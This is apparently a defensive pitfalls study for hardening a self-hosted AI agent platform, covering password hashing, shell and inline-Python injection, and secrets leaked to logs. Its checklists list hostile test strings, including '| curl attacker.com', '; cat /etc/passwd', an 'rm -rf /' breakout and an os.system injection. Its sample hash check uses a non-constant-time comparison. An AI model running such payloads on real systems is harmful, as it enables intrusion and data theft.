# Pitfalls Research

**Domain:** Production hardening of existing self-hosted AI agent platform (GooseClaw v4.0)
**Researched:** 2026-03-16
**Confidence:** HIGH (based on codebase analysis + verified security research)

## Critical Pitfalls

### Pitfall 1: Password hash migration locks out existing users

**What goes wrong:**
Switching from SHA-256 to a new hash algorithm means the stored `web_auth_token_hash` in `/data/config/setup.json` on the persistent Railway volume becomes unverifiable. Container restarts with new code, user enters correct password, new verification function doesn't recognize the old SHA-256 format, user is permanently locked out. Recovery secret is the only way back in.

**Why it happens:**
Developers test with fresh installs. The upgrade path (old hash format on disk, new code running) is never tested. The current `hash_token()` at gateway.py line 1090 returns a bare hex string with no algorithm prefix. There's no way to distinguish "this is SHA-256" from "this is PBKDF2" just by looking at the stored value.

**How to avoid:**
1. Tag new hashes with a prefix: `$pbkdf2$salt$hash` vs bare hex for legacy SHA-256
2. `verify_token()` checks for prefix first. If present, use new algorithm. If bare hex, fall back to SHA-256
3. On successful SHA-256 verification, transparently rehash with PBKDF2 and save. This is "lazy migration", the standard pattern
4. Write an explicit test: create a SHA-256 hash with the OLD `hash_token()`, then verify it with the NEW `verify_token()`, then confirm transparent upgrade happened

**Warning signs:**
- Tests only use freshly generated hashes, never pre-existing SHA-256 values
- `verify_token()` doesn't check hash format prefix
- No test named something like `test_legacy_sha256_migration`

**Phase to address:**
Security fixes, FIRST item. Every other security change depends on auth working. If auth is broken, you can't access the admin panel to debug anything else.

---

### Pitfall 2: stdlib constraint makes argon2/bcrypt impossible, but PBKDF2 is fine

**What goes wrong:**
The project says "Python stdlib only for gateway.py." Argon2 requires `argon2-cffi`. Bcrypt requires `bcrypt`. Neither is stdlib. Teams waste time debating whether to "relax the constraint" or attempt pure-Python implementations of argon2 (which don't exist at production quality).

**Why it happens:**
The PROJECT.md milestone says "swap SHA-256 for argon2/bcrypt" without checking whether those are available under the stdlib constraint. The Dockerfile already pip-installs packages (PyYAML, chromadb) but the gateway.py constraint remains.

**How to avoid:**
Use `hashlib.pbkdf2_hmac()` which has been in Python stdlib since 3.4 and is OWASP-approved. With 600,000 iterations of SHA-256 and a 16-byte random salt, PBKDF2 provides orders of magnitude more resistance than bare SHA-256 (180 billion SHA-256 hashes/sec vs ~1,000 PBKDF2 hashes/sec on GPU). This is the correct choice given the constraint.

Concrete implementation that stays stdlib-only:
```python
import hashlib, os, base64

def hash_password(password: str) -> str:
    salt = os.urandom(16)
    dk = hashlib.pbkdf2_hmac('sha256', password.encode(), salt, 600_000)
    return f"$pbkdf2${base64.b64encode(salt).decode()}${base64.b64encode(dk).decode()}"

def verify_password(password: str, stored: str) -> bool:
    if stored.startswith("$pbkdf2$"):
        _, _, salt_b64, dk_b64 = stored.split("$", 3)
        salt = base64.b64decode(salt_b64)
        dk = hashlib.pbkdf2_hmac('sha256', password.encode(), salt, 600_000)
        return base64.b64encode(dk).decode() == dk_b64
    # legacy SHA-256 fallback (no salt, no iterations)
    return hashlib.sha256(password.encode()).hexdigest() == stored
```

Alternative: `hashlib.scrypt()` (stdlib since 3.6) is memory-hard and arguably stronger, but PBKDF2 is more widely understood and audited.

**Warning signs:**
- Adding argon2-cffi or bcrypt to requirements.txt
- Discussions about "should we relax the stdlib constraint"
- Implementing password hashing without a salt (just switching to PBKDF2 with no salt is still weak)

**Phase to address:**
Security fixes. Architectural decision that must be made BEFORE implementation starts.

---

### Pitfall 3: Shell injection through subprocess shell=True in job execution

**What goes wrong:**
Gateway.py line 3801-3803 runs job commands with `subprocess.run(command, shell=True)`. The `command` field comes from the job creation API (`POST /api/jobs`). The Goose AI agent creates jobs via this API. If the AI is tricked or compromised, arbitrary shell commands execute in the container. This is the single most exploitable vulnerability in the codebase.

**Why it happens:**
Jobs need to run commands like `curl -s api/costs | notify` which require shell pipe interpretation. `shell=True` was the easy path. Removing it naively (just setting `shell=False`) breaks every command that uses pipes, redirections, or subshells.

**How to avoid:**
Don't just flip `shell=True` to `shell=False`. That breaks legitimate usage. Instead:
1. Create an allowlist of known safe script paths: `/usr/local/bin/notify`, `/usr/local/bin/job`, `/usr/local/bin/remind`, `/usr/local/bin/secret`
2. For allowlisted scripts, use `subprocess.run([script_path, ...args], shell=False)`
3. For commands with pipes, use `shlex.split()` and `subprocess.Popen` chains connecting stdout to stdin
4. Reject commands containing shell metacharacters (`;`, `&&`, `||`, `` ` ``, `$(`, etc.) unless they match the pipe pattern `cmd1 | cmd2`
5. At minimum, log all commands before execution for audit trail

**Warning signs:**
- Tests mock subprocess instead of testing actual command execution with adversarial inputs
- No input validation on the `command` field in job creation endpoint
- The fix only changes `shell=True` to `shell=False` without handling pipes

**Phase to address:**
Security fixes. Address after auth migration (Pitfall 1) since this requires more careful design.

---

### Pitfall 4: Inline Python string interpolation in shell scripts is injection-prone

**What goes wrong:**
secret.sh, entrypoint.sh, job.sh, and remind.sh all embed shell variables into inline Python code using single-quote interpolation: `python3 -c "... '$VARIABLE' ..."`. A value containing a single quote breaks out of the Python string literal. Example: secret.sh line 42 has `'$DOTPATH'.split('.')`. A dotpath value of `'; import os; os.system("id"); '` executes arbitrary Python.

**Why it happens:**
The pattern of calling `python3 -c` from bash to do JSON/YAML processing is common when you can't install jq-for-YAML or want more logic than jq provides. String interpolation is the obvious (but wrong) way to pass data in. The job.sh `cmd_create` function (line 284) already does it correctly using environment variables. The other scripts don't follow the same pattern.

**How to avoid:**
Convert every instance of `'$VARIABLE'` in inline Python to use `os.environ`:
- Before: `python3 -c "keys = '$DOTPATH'.split('.')"`
- After: `DOTPATH="$DOTPATH" python3 -c "import os; keys = os.environ['DOTPATH'].split('.')"`

The fix is mechanical. Grep for `python3 -c` in all .sh files, find every `$` reference inside the Python string, and convert to os.environ. job.sh cmd_create already shows the correct pattern.

Also fix entrypoint.sh lines 59-73 where `$GOOSECLAW_RESET_PASSWORD` is embedded directly. A password containing a single quote breaks the script.

**Warning signs:**
- `grep -n "python3 -c" *.sh` shows raw `$VARIABLE` inside the Python string (not via os.environ)
- No tests for shell scripts with adversarial inputs (quotes, semicolons, newlines)

**Phase to address:**
Security fixes. Quick mechanical fix, can be done in parallel with other security work.

---

### Pitfall 5: Recovery secret leaked in container startup logs

**What goes wrong:**
Entrypoint.sh line 39 prints `GOOSECLAW_RECOVERY_SECRET=$RECOVERY_SECRET` to stdout on first boot. Railway captures all container stdout as deployment logs visible in the dashboard. Anyone with Railway project access (including team members, support staff) can read the recovery secret from historical logs. This secret enables password resets.

**Why it happens:**
Added as a UX convenience so users can copy the secret to Railway env vars. But stdout in containerized environments is persistent, shared, and often forwarded to log aggregation services.

**How to avoid:**
Remove the echo of the full secret value. Options:
1. Print only masked version: `echo "[init] GOOSECLAW_RECOVERY_SECRET=${RECOVERY_SECRET:0:4}..."`
2. Tell user to retrieve via Railway shell: `echo "[init] run 'cat /data/.recovery_secret' in Railway shell to see your recovery secret"`
3. Best: set it as a Railway env var programmatically via Railway API (if available)

**Warning signs:**
- `grep -rn 'echo.*SECRET\|echo.*TOKEN\|echo.*KEY' *.sh` returns matches
- Container logs contain base64 or url-safe random strings

**Phase to address:**
Security fixes. One-line fix, should be in the very first commit.

---

### Pitfall 6: Retrofitting tests on a 400KB monolith creates fragile mocks

**What goes wrong:**
gateway.py is 9700+ lines in a single file. Testing individual HTTP endpoints requires importing the entire module and mocking dozens of globals (`_telegram_sessions`, `goose_lock`, `_jobs`, etc.). Tests become tightly coupled to implementation details. A small refactor breaks 50 tests even though behavior didn't change. The test suite becomes a maintenance burden rather than a safety net.

**Why it happens:**
The module wasn't designed for testability. Functions reference module-level globals directly. There's no dependency injection, no request context object, no handler registry. The existing test_gateway.py (8640 lines, 624 tests) already demonstrates this: it heavily patches module globals.

**How to avoid:**
1. Accept the monolith for now. Don't refactor gateway.py into modules during hardening. That's a separate project.
2. Test at the HTTP level, not the function level. Spin up an actual HTTPServer on a random port, make real HTTP requests, assert on responses. This tests behavior, not implementation.
3. Use `unittest.mock.patch.dict` for global dicts rather than replacing them entirely. This preserves other state.
4. For new security tests, test the public interface: "POST /api/auth/login with correct password returns 200 and session cookie." Not: "verify_token() returns True when hash matches."
5. Keep test files focused: one test file per concern (test_auth.py, test_jobs.py, test_shell_scripts.py) rather than one giant test_gateway.py.

**Warning signs:**
- Test files growing past 2000 lines
- Tests that patch more than 3 things
- Tests that break when internal variable names change
- Tests that pass individually but fail when run together (shared state leaking between tests)

**Phase to address:**
Testing phase. Establish testing patterns BEFORE writing all the tests.

---

## Technical Debt Patterns

| Shortcut | Immediate Benefit | Long-term Cost | When Acceptable |
|----------|-------------------|----------------|-----------------|
| `print()` instead of structured logging | Zero setup, works everywhere. 252+ existing calls. | Can't parse, filter, or aggregate in production. No log levels. No timestamps. No request correlation. | Never in production. But migrate incrementally, not all at once. |
| 400KB monolith gateway.py | Everything in one file, easy to grep, no import cycles | Impossible to test units in isolation. IDE chokes. Import takes seconds. | Accept for v4.0. Refactoring is a separate milestone. |
| `shell=True` for job execution | Shell pipes work naturally | Every job command is a potential RCE vector | Never for user/AI-controlled input |
| SHA-256 for passwords | Works, zero dependencies, fast | Crackable in milliseconds (180B hashes/sec on GPU) | Never. PBKDF2 stdlib is trivial to add. |
| Unpinned dependency ranges (chromadb>=1.0.0,<2.0.0) | Gets latest patches automatically | Non-reproducible builds. Surprise breaking changes. | Only during rapid prototyping. Pin with == for production. |
| No request body size limits | Simpler handler code | DoS via 100MB POST body consuming all container memory | Never in production. Add Content-Length check. |

## Integration Gotchas

| Integration | Common Mistake | Correct Approach |
|-------------|----------------|------------------|
| Railway volumes | Assuming /data always has expected files. Volume can be empty on region migration or new deployment. | Every file read from /data must handle FileNotFoundError gracefully. First-boot detection exists but individual readers don't all check. |
| Railway health checks | Health check depends on goose web subprocess being ready. Goose web takes 10-30s to start. Health check fails during startup. | /api/health should return 200 even if goose web isn't ready, just include status field. Current HEALTHCHECK has --retries=3 which helps but verify the endpoint behavior. |
| PBKDF2 on Railway CPU | Railway containers may have throttled CPU. 600K iterations takes 250ms on fast hardware but could take 1-2s on throttled CPU. | Benchmark on actual Railway container. If >500ms, reduce iterations to 300K (still vastly better than bare SHA-256). |
| Structured logging on Railway | Railway's log viewer has line length limits. JSON log lines can be very long. | Set max field length in log format. Truncate request/response bodies in logs. Test that Railway log viewer renders them properly. |
| Security headers vs reverse proxy | Railway's proxy may add or strip headers. Setting Strict-Transport-Security locally might conflict with Railway's TLS termination. | Test each header in actual Railway deployment, not just locally. Some headers (HSTS, CSP) can break things if misconfigured. |

## Performance Traps

| Trap | Symptoms | Prevention | When It Breaks |
|------|----------|------------|----------------|
| PBKDF2 before rate limiter | Each brute-force attempt consumes 250ms CPU even when rate-limited | Apply rate limiter BEFORE hash computation in the auth handler. Current rate limiter is at request level but verify the code path order. | Under sustained brute-force (>100 req/s) |
| JSON logging of large request/response bodies | Log files explode. Container disk fills. Railway charges for egress. | Truncate body content in logs to 1KB max. Never log full file uploads or base64 content. | First large file upload or long AI response |
| Test suite importing 400KB module | Each test file parses 9700 lines on import. 4 test files = 4 parses. | The existing tests already handle this with single import. New test files should follow the same pattern. Use pytest-xdist for parallelism. | When test count exceeds 1000 |
| CVE scanning on every CI run | Scan takes 2-5 minutes. Blocks deployment. | Cache scan results. Only re-scan when Dockerfile or requirements.txt changes. Run full scan weekly, not on every push. | Immediately if added to CI without caching |

## Security Mistakes

| Mistake | Risk | Prevention |
|---------|------|------------|
| SHA-256 passwords without salt | Full password database crackable via rainbow tables in minutes | PBKDF2 with random 16-byte salt and 600K iterations |
| Recovery secret in stdout | Anyone with log access can reset any password | Remove echo or mask to first 4 chars |
| `shell=True` in subprocess | RCE if AI agent is tricked into crafting malicious job commands | Allowlist scripts, validate command patterns, use shell=False where possible |
| `'$VAR'` interpolation in inline Python | Shell injection through any user-controlled shell variable | Always use os.environ to pass data to inline Python |
| No Content-Length limit | DoS via memory exhaustion from large POST bodies | Check Content-Length header, reject >1MB before reading body |
| Passwords in entrypoint.sh via env var | GOOSECLAW_RESET_PASSWORD value embedded in Python heredoc without escaping | Pass via os.environ, not string interpolation |
| Security headers breaking inline JS | CSP blocks setup.html's inline scripts, locking user out of setup | Test all headers against setup.html. Use nonces or hashes for CSP. Or skip CSP for setup.html specifically. |

## UX Pitfalls

| Pitfall | User Impact | Better Approach |
|---------|-------------|-----------------|
| Logging format change breaks existing log drains | Users with Datadog/Loki integrations see unparseable logs | Support both formats with a feature flag. Default to new JSON format but allow LOG_FORMAT=text env var. |
| PBKDF2 making login feel slower | Login takes 250ms instead of instant. User notices on slow Railway container. | 250ms is fine. But if it's >1s on Railway CPU, reduce iterations. Never compromise UX for theoretical security. |
| Security headers blocking setup wizard | User deploys update, can't access setup page due to CSP. No way to reconfigure. | Test CSP against setup.html BEFORE deploying. Have a CSP bypass for /setup path if needed. |
| Graceful shutdown killing active conversation | User is mid-conversation, container restarts, response is lost | Send shutdown warning to active channels. Save session state. Complete in-flight relay before stopping. |
| Test failures blocking deployment | New tests are flaky, CI fails intermittently, deploys are blocked | Quarantine flaky tests immediately. Never let test suite block production hotfixes. |

## "Looks Done But Isn't" Checklist

- [ ] **Password migration:** Tested with an ACTUAL SHA-256 hash from current production setup.json, not a freshly generated one
- [ ] **Password migration:** entrypoint.sh password reset (lines 59-73) ALSO uses the new hash function, not still using SHA-256
- [ ] **Shell injection fix:** Tested with commands containing: `; cat /etc/passwd`, `$(whoami)`, `` `id` ``, `| curl attacker.com`, `' ; rm -rf / '`
- [ ] **Shell script injection fix:** Tested secret.sh with dotpath containing single quotes, double quotes, backticks, semicolons
- [ ] **Structured logging:** ALL 252+ print() calls converted, not just the "important" ones. grep confirms zero remaining.
- [ ] **Security headers:** Tested against setup.html (heavy inline JS/CSS), admin.html, AND the goose web reverse proxy pass-through
- [ ] **Graceful shutdown:** Tested with active goose web session AND active channel relay, not just idle container
- [ ] **Request body limits:** Applied to ALL endpoints that read body, not just /api/setup
- [ ] **Dependency pinning:** ALL packages use exact versions (==). No >= or < ranges remain.
- [ ] **Rate limiter + PBKDF2 ordering:** Rate limit check happens BEFORE the expensive hash computation in auth handler code path
- [ ] **CVE scan:** Run against the BUILT Docker image, not just the Dockerfile. Base image ubuntu:22.04 may have unpatched vulns.
- [ ] **Non-root after init:** After entrypoint.sh drops privileges, verify no subprocess (goose web, channel plugins) escalates back to root

## Recovery Strategies

| Pitfall | Recovery Cost | Recovery Steps |
|---------|---------------|----------------|
| Password hash migration locks users out | LOW | Recovery secret still works (unless that was also broken). User does POST /api/auth/recover, gets temp password, logs in. Test this FIRST. |
| Shell injection exploited | HIGH | Attacker had container shell. Rotate ALL secrets: vault.yaml credentials, API keys, bot tokens, recovery secret. Redeploy from clean image. Audit Railway logs. Consider what data was accessible from /data volume. |
| Security headers break setup wizard | LOW | Remove offending header, redeploy. Railway redeploy takes ~2 minutes. Users regain access immediately. |
| Structured logging breaks log drains | LOW | Set LOG_FORMAT=text env var in Railway to revert. Fix JSON format. Redeploy. |
| Flaky tests block deployment | LOW | Skip flaky test with pytest marker. Deploy. Fix test. Remove skip. |
| PBKDF2 too slow on Railway CPU | LOW | Reduce iterations (300K still safe). Or switch to hashlib.scrypt() which is memory-hard but faster per-iteration. |

## Pitfall-to-Phase Mapping

| Pitfall | Prevention Phase | Verification |
|---------|------------------|--------------|
| Password hash migration (Pitfall 1) | Security fixes, first item | Test: create SHA-256 hash, verify with new code, confirm transparent rehash to PBKDF2 |
| stdlib vs argon2/bcrypt (Pitfall 2) | Security fixes, arch decision | Verify: no argon2/bcrypt imports in gateway.py, only hashlib.pbkdf2_hmac |
| Shell injection in jobs (Pitfall 3) | Security fixes | Test: create job with `; cat /etc/passwd` command, verify rejection or safe execution |
| Inline Python injection (Pitfall 4) | Security fixes | Test: `secret set "test.key" "'; os.system('id'); '"` doesn't execute code |
| Recovery secret in logs (Pitfall 5) | Security fixes, first commit | Verify: `docker logs` from first boot doesn't show full secret |
| Fragile test mocks (Pitfall 6) | Testing phase, establish patterns first | Review: new tests use HTTP-level testing, not internal function patching |
| print() to structured logging | Hardening phase | `grep -c "^[^#]*print(" gateway.py` returns 0 or known-intentional count |
| Unpinned dependencies | Hardening phase | `grep -c "[><=]" requirements.txt` returns 0 (all use ==) |
| Request body size limits | Hardening phase | Test: POST 100MB to /api/setup, verify rejection before full body read |
| Security headers vs setup.html | Hardening phase | Manual: load setup.html with all headers, verify no console errors, inline JS works |
| Graceful shutdown | Hardening phase | Test: SIGTERM during active relay, verify clean shutdown and notification to user |

## Sources

- [OWASP Password Hashing Guide 2025](https://guptadeepak.com/the-complete-guide-to-password-hashing-argon2-vs-bcrypt-vs-scrypt-vs-pbkdf2-2026/) - PBKDF2 vs argon2 vs bcrypt comparison, iteration recommendations
- [Python hashlib documentation](https://docs.python.org/3/library/hashlib.html) - pbkdf2_hmac and scrypt stdlib availability confirmed
- [Simon Willison: Password hashing with PBKDF2](https://til.simonwillison.net/python/password-hashing-with-pbkdf2) - practical PBKDF2 implementation
- [OpenStack: Python Pipes to Avoid Shells](https://security.openstack.org/guidelines/dg_avoid-shell-true.html) - shell=True avoidance patterns
- [Bandit B602](https://bandit.readthedocs.io/en/latest/plugins/b602_subprocess_popen_with_shell_equals_true.html) - subprocess shell=True security rule
- [Snyk: Command Injection in Python](https://snyk.io/blog/command-injection-python-prevention-examples/) - injection prevention patterns
- [OWASP Docker Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Docker_Security_Cheat_Sheet.html) - container hardening
- [Why Retrofitting Tests Is Hard](https://modelephant.medium.com/software-engineering-why-retrofitting-tests-is-hard-9ea4e7af3e48) - testing retrofit challenges
- [New Relic: Structured Logging in Python](https://newrelic.com/blog/log/python-structured-logging) - JSON logging patterns and migration
- Codebase analysis: gateway.py (406KB, 9700+ lines), entrypoint.sh (700+ lines), secret.sh, job.sh, remind.sh, notify.sh, test_gateway.py (8640 lines, 624 tests)

---
*Pitfalls research for: GooseClaw v4.0 Production Hardening*
*Researched: 2026-03-16*
